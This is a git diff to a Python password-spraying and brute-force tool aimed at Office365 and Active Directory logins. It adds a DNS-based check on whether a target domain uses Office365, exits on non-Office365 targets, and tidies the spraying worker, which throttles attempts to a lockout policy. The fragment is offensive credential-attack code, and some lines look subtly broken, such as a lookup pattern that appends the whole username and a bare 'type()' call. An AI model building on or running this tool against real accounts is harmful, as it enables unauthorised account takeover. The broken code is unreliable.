@@ -12,6 +12,8 @@ import sys
 import platform
 from colorama import init, Fore
 from time import sleep
+from selenium import webdriver
+from selenium.webdriver.common.keys import Keys
 
 init()
 
@@ -71,7 +73,8 @@ def brute_office(username,password):
         
         
     else:
-        print(Fore.RED+"[+] Error! Unknown error code")
+        print(Fore.RED+"[+] Error! Unknown error code. Target does not seem to be using Office365")
+        sys.exit(0)
 
 
 def sprayAD(host):
@@ -79,8 +82,23 @@ def sprayAD(host):
     pass
 
 def check_o365(username):
-    isO365 = True
-    return isO365
+    iso365 = False
+    domain = username.split('@')[1].replace('.', '-')
+    url_dict = {
+        "Global Office365": ".mail.protection.outlook.com",
+        "other convention for Office365": ".mail.protection." + username
+    }
+
+    for line in url_dict:
+        try:
+            socket.gethostbyname(domain + url_dict[line])
+            iso365 = True
+            return True
+        except:
+            pass
+    if not iso365:
+        return False
+
 
 def get_credentials(auth):
     t = type()
@@ -90,7 +108,6 @@ def hybrid_office_worker(policy,user,_pass):
     max_attempts, timelimit = tuple(policy.split(','))
     timelimit = 60*int(timelimit)
     max_attempts = int(max_attempts) - 1
-    print(type(user))
     if isinstance(user, str):
         #this shows we are spraying a single username against a passfile
         try:
